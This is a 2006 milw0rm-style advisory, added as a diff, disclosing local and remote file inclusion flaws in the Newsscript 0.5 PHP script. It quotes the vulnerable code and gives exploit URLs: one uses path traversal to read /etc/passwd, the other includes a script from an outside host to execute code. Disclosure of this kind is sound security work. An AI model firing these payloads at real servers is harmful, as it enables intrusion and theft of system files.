@@ -1,0 +1,60 @@
+#  Product : Newsscript
+
+#  Homepage : http://www.webmaster-journal.com
+
+#  Version : 0.5
+
+#  Date : 12-09-2006
+
+#  Vulnerability : Remote & local File Inclusion
+
+#  Risk : High
+
+---------------------------------------------------------------------------------------------------------
+
+
+#  Description :
+
+Newsscript is a PHP script to manage news items on website without Database.
+
+
+#  Vulnerable Code :
+
+The first issue is due to an input validation error in the "print/print.php" script that does not validate the "ide" parameter, which could be exploited by remote attackers to include local files with the privileges of the web server.
+
+1    <html>
+2    <head>
+3    <?
+4 $file_name = "../".$ide.".txt";
+5    ?>
+
+
+27    include($file_name);
+
+
+The second flaw is due to an input validation error in the "article.php" script that does not validate the "ide" parameter, which could be exploited by attackers to include remote or local files and execute arbitrary commands with privileges of the web server.
+
+1 <?
+2 include($ide.".txt");
+3 ?>
+
+
+#  Exploit :
+
+http://localhost/newscript/print/print.php?ide=../../../../etc/passwd%00
+
+http://localhost/newscript/article.php?ide=http://site.com/script.txt ?
+
+
+#  Solution :
+
+Update to a newer version
+
+
+#  Discovered By:
+
+Daftrix[at]Gmail.com
+Daftrix Security Investigations
+http://www.Daftrix.com
+
+# milw0rm.com [2006-09-13]
